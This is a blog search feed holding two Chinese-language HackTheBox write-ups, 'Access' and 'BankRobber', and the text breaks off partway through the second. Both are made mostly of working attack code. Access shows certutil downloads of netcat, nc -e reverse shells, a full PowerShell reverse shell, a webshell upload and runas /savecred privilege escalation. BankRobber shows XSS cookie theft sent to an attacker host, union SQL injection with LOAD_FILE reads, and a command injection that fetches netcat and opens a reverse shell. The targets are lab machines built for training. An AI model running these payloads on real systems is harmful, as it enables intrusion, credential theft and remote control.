<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Access</title>
    <link href="/2025/02/10/HTB-Access/"/>
    <url>/2025/02/10/HTB-Access/</url>
    
    <content type="html"><![CDATA[<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">98</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.98</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.10.98</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.98</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.98</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210172733361.png" alt="image-20250210172733361"></p><h3 id="ftp探索"><a href="#ftp探索" class="headerlink" title="ftp探索"></a>ftp探索</h3><p><img src="/../imgs/image-20250210172859452.png" alt="image-20250210172859452"></p><p><img src="/../imgs/image-20250210172910071.png" alt="image-20250210172910071"></p><p>拿下来看看，zip需要密码</p><p><img src="/../imgs/image-20250210173411154.png" alt="image-20250210173411154"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">zip2john Access\ Control.zip &gt; <span class="hljs-built_in">hash</span><br>john  --wordlist=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>mdb文件存在用户名泄露</p><p><img src="/../imgs/image-20250210173456791.png" alt="image-20250210173456791"></p><p>往右边托有密码</p><p><img src="/../imgs/image-20250210173648618.png" alt="image-20250210173648618"></p><p>auth_user也存在密码</p><p><img src="/../imgs/image-20250210173808624.png" alt="image-20250210173808624"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">John<br><span class="hljs-selector-tag">Mark</span><br>Sunita<br>Mary<br>Monica<br>admin<br>engineer<br>backup_admin<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">020481</span><br><span class="hljs-number">010101</span><br><span class="hljs-number">000000</span><br><span class="hljs-number">666666</span><br><span class="hljs-number">123321</span><br><span class="hljs-keyword">admin</span><br>access4u@<span class="hljs-keyword">security</span><br><span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>拿密码爆破压缩包</p><p><img src="/../imgs/image-20250210174255998.png" alt="image-20250210174255998"></p><p>然后打开利用outlook打开pst文件</p><p><img src="/../imgs/image-20250210174628551.png" alt="image-20250210174628551"></p><p>又来一个账户密码</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">security</span><br>4Cc3ssC0ntr0ller<br></code></pre></td></tr></table></figure><h3 id="telnet探索"><a href="#telnet探索" class="headerlink" title="telnet探索"></a>telnet探索</h3><p>拿着security登录telnet</p><p><img src="/../imgs/image-20250210182755587.png" alt="image-20250210182755587"></p><p><img src="/../imgs/image-20250210182814674.png" alt="image-20250210182814674"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先用nc反弹回来，不然回显有点慢</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> <span class="hljs-keyword">c</span>:\programdata<br>certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span>/nc64.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span><br>nc.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">e</span> cmd <span class="hljs-number">10.10</span>.<span class="hljs-number">16.39</span> <span class="hljs-number">9001</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210183911656.png" alt="image-20250210183911656"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$LHOST</span> = <span class="hljs-string">&quot;10.10.16.39&quot;</span>; <span class="hljs-variable">$LPORT</span> = <span class="hljs-number">9001</span>; <span class="hljs-variable">$TCPClient</span> = <span class="hljs-built_in">New-Object</span> Net.Sockets.TCPClient(<span class="hljs-variable">$LHOST</span>, <span class="hljs-variable">$LPORT</span>); <span class="hljs-variable">$NetworkStream</span> = <span class="hljs-variable">$TCPClient</span>.GetStream(); <span class="hljs-variable">$StreamReader</span> = <span class="hljs-built_in">New-Object</span> IO.StreamReader(<span class="hljs-variable">$NetworkStream</span>); <span class="hljs-variable">$StreamWriter</span> = <span class="hljs-built_in">New-Object</span> IO.StreamWriter(<span class="hljs-variable">$NetworkStream</span>); <span class="hljs-variable">$StreamWriter</span>.AutoFlush = <span class="hljs-variable">$true</span>; <span class="hljs-variable">$Buffer</span> = <span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-number">1024</span>; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$TCPClient</span>.Connected) &#123; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$NetworkStream</span>.DataAvailable) &#123; <span class="hljs-variable">$RawData</span> = <span class="hljs-variable">$NetworkStream</span>.Read(<span class="hljs-variable">$Buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Buffer</span>.Length); <span class="hljs-variable">$Code</span> = ([<span class="hljs-type">text.encoding</span>]::UTF8).GetString(<span class="hljs-variable">$Buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$RawData</span> <span class="hljs-literal">-1</span>) &#125;; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$TCPClient</span>.Connected <span class="hljs-operator">-and</span> <span class="hljs-variable">$Code</span>.Length <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span>) &#123; <span class="hljs-variable">$Output</span> = <span class="hljs-keyword">try</span> &#123; <span class="hljs-built_in">Invoke-Expression</span> (<span class="hljs-variable">$Code</span>) <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &#125; <span class="hljs-keyword">catch</span> &#123; <span class="hljs-variable">$_</span> &#125;; <span class="hljs-variable">$StreamWriter</span>.Write(<span class="hljs-string">&quot;<span class="hljs-variable">$Output</span>`n&quot;</span>); <span class="hljs-variable">$Code</span> = <span class="hljs-variable">$null</span> &#125; &#125;; <span class="hljs-variable">$TCPClient</span>.Close(); <span class="hljs-variable">$NetworkStream</span>.Close(); <span class="hljs-variable">$StreamReader</span>.Close(); <span class="hljs-variable">$StreamWriter</span>.Close()<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">certutil</span>.exe -urlcache -split -f http://<span class="hljs-number">10.10.16.39</span>/<span class="hljs-number">1</span>.ps1 <span class="hljs-number">1</span>.ps1<br><br><span class="hljs-attribute">C</span>:\Windows\system32\windowspowershell\v1.<span class="hljs-number">0</span>\powershell.exe -c c:\temp\<span class="hljs-number">1</span>.ps1<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210184136208.png" alt="image-20250210184136208"></p><p>上传webshell看看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">certutil</span>.exe -urlcache -split -f http://<span class="hljs-number">10.10.16.39</span>/<span class="hljs-number">1</span>.aspx <span class="hljs-number">1</span>.aspx<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210184256788.png" alt="image-20250210184256788"></p><p>看下凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmdkey /list<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210190813011.png" alt="image-20250210190813011"></p><p>尝试利用runas反弹shell</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">runas <span class="hljs-symbol">/savecred</span> <span class="hljs-operator">/</span>user:ACCESS\Administrator <span class="hljs-string">&quot;c:<span class="hljs-char escape_">\p</span>rogramdata<span class="hljs-char escape_">\n</span>c.exe -e cmd 10.10.16.39 9001&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250210190850184.png" alt="image-20250210190850184"></p><p><img src="/../imgs/image-20250210190748739.png" alt="image-20250210190748739"></p><p>成功</p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BankRobber</title>
    <link href="/2025/02/08/HTB-BankRobber/"/>
    <url>/2025/02/08/HTB-BankRobber/</url>
    
    <content type="html"><![CDATA[<h2 id="BankRobber"><a href="#BankRobber" class="headerlink" title="BankRobber"></a>BankRobber</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">154</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.154</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.10.154</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.154</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.154</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250207182645376.png" alt="image-20250207182645376"></p><h3 id="web服务探索"><a href="#web服务探索" class="headerlink" title="web服务探索"></a>web服务探索</h3><p>有登录注册功能</p><p><img src="/../imgs/image-20250207191620847.png" alt="image-20250207191620847"></p><p>我们注册一个进去</p><p><img src="/../imgs/image-20250207191544553.png" alt="image-20250207191544553"></p><p>xss</p><p><img src="/../imgs/image-20250207191550300.png" alt="image-20250207191550300"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39:3000/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250207191646309.png" alt="image-20250207191646309"></p><p>借助beefxss获取cookie</p><p><img src="/../imgs/image-20250207191703315.png" alt="image-20250207191703315"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=YWRtaW4%3D; <span class="hljs-attribute">password</span>=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; <span class="hljs-attribute">id</span>=1; <span class="hljs-attribute">BEEFHOOK</span>=hSriBU2AvmCvbBSAhfqKKUGPPULhH0KXbJqySgRwgp0GE7PGyZPPPLq8txtDHo1TfAtNGVXbCcNytgfx<br></code></pre></td></tr></table></figure><p>或者写一个js让admin访问</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>request.open(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39/?test=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie, <span class="hljs-keyword">true</span>);<br>request.send()<br></code></pre></td></tr></table></figure><p>存入js文件，然后开启服务器,payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39/cookie.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们拿着获取的cookie解码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YWRtaW4</span><span class="hljs-operator">=</span> -&gt; admin<br><span class="hljs-attribute">SG9wZWxlc3Nyb21hbnRpYw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> -&gt; Hopelessromantic<br></code></pre></td></tr></table></figure><p>登录</p><p><img src="/../imgs/image-20250207192536838.png" alt="image-20250207192536838"></p><p><img src="/../imgs/image-20250207192547968.png" alt="image-20250207192547968"></p><p>sql注入</p><p><img src="/../imgs/image-20250207195122405.png" alt="image-20250207195122405"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+order+by <span class="hljs-number">3</span>#<br><br><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250207195219002.png" alt="image-20250207195219002"></p><p>2有回显</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,database(),3#<br><span class="hljs-comment">#bankrobber</span><br><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#<br>balance hold<span class="hljs-built_in"> users</span><br><span class="hljs-built_in"></span><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&quot;users&quot;</span>#<br>id,username,password<br><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(id,<span class="hljs-string">&quot;,&quot;</span>,username,<span class="hljs-string">&quot; &quot;</span>,password),3 <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p>也许我们需要去写shell</p><p><img src="/../imgs/image-20250207200622807.png" alt="image-20250207200622807"></p><p><img src="/../imgs/image-20250207200626745.png" alt="image-20250207200626745"></p><p><img src="/../imgs/image-20250207200632601.png" alt="image-20250207200632601"></p><p>我们尝试读文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,LOAD_FILE(&#x27;C:/xampp/htdocs/index.php&#x27;),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250207200817257.png" alt="image-20250207200817257"></p><p>读命令执行的php</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,LOAD_FILE(&#x27;C:/xampp/htdocs/admin/backdoorchecker.php&#x27;),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../link.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;auth.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]));<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));<br><span class="hljs-variable">$bad</span>   = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br><span class="hljs-variable">$good</span>   = <span class="hljs-string">&quot;ls&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">substr</span>(PHP_OS,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)) == <span class="hljs-string">&quot;win&quot;</span>)&#123;<br><span class="hljs-variable">$good</span> = <span class="hljs-string">&quot;dir&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-string">&quot;Hopelessromantic&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br><span class="hljs-comment">// FILTER ESCAPE CHARS</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$bad</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You&#x27;re not allowed to do that.&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>], <span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$good</span>)) != <span class="hljs-variable">$good</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;It&#x27;s only allowed to use the <span class="hljs-subst">$good</span> command&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;::1&quot;</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;It&#x27;s only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.&quot;</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not allowed to use this function!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>REMOTE_ADDR不可以伪造，</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>我们利用xss让admin去读</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;cmd=dir&#x27;</span>;<br>request.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://localhost/admin/backdoorchecker.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>request.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>);<br>request.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; request.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-keyword">var</span> responseText = request.<span class="hljs-property">responseText</span>;<br>        <span class="hljs-keyword">var</span> remoteRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        remoteRequest.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39:9001&#x27;</span>, <span class="hljs-literal">true</span>);<br>        remoteRequest.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>);<br>        remoteRequest.<span class="hljs-title function_">send</span>(responseText);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">var</span> param1 = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>        <span class="hljs-keyword">var</span> remoteRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        remoteRequest.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39:9001&#x27;</span>, <span class="hljs-literal">true</span>);<br>        remoteRequest.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>);<br>        remoteRequest.<span class="hljs-title function_">send</span>(param1);<br>    &#125;<br>    &#125;;<br>request.<span class="hljs-title function_">send</span>(param);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();<br><span class="hljs-keyword">var</span> <span class="hljs-keyword">params</span> = <span class="hljs-string">&#x27;cmd=dir|powershell -c &quot;iwr -uri 10.10.16.39/nc64.exe -outfile %temp%\\n.exe&quot;; %temp%\\n.exe -e cmd.exe 10.10.16.39 9001&#x27;</span>;<br>request.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://localhost/admin/backdoorchecker.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>request.setRequestHeader(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>);<br>request.send(<span class="hljs-keyword">params</span>);<br></code></pre></td></tr></table></figure><p>发送如下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39/shell.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208002807070.png" alt="image-20250208002807070"></p><h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p>查看js文件</p><p><img src="/../imgs/image-20250208001712469.png" alt="image-20250208001712469"></p><p>我们可以直接调用</p><p>反弹shell ps1脚本如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$socket</span> = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient(<span class="hljs-string">&#x27;10.10.16.39&#x27;</span>, <span class="hljs-number">9001</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$socket</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$null</span>)&#123;<span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>&#125;<br><span class="hljs-variable">$stream</span> = <span class="hljs-variable">$socket</span>.GetStream();<br><span class="hljs-variable">$writer</span> = <span class="hljs-built_in">new-object</span> System.IO.StreamWriter(<span class="hljs-variable">$stream</span>);<br><span class="hljs-variable">$buffer</span> = <span class="hljs-built_in">new-object</span> System.Byte[] <span class="hljs-number">1024</span>;<br><span class="hljs-variable">$encoding</span> = <span class="hljs-built_in">new-object</span> System.Text.AsciiEncoding;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-variable">$writer</span>.Flush();<br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$null</span>;<br><span 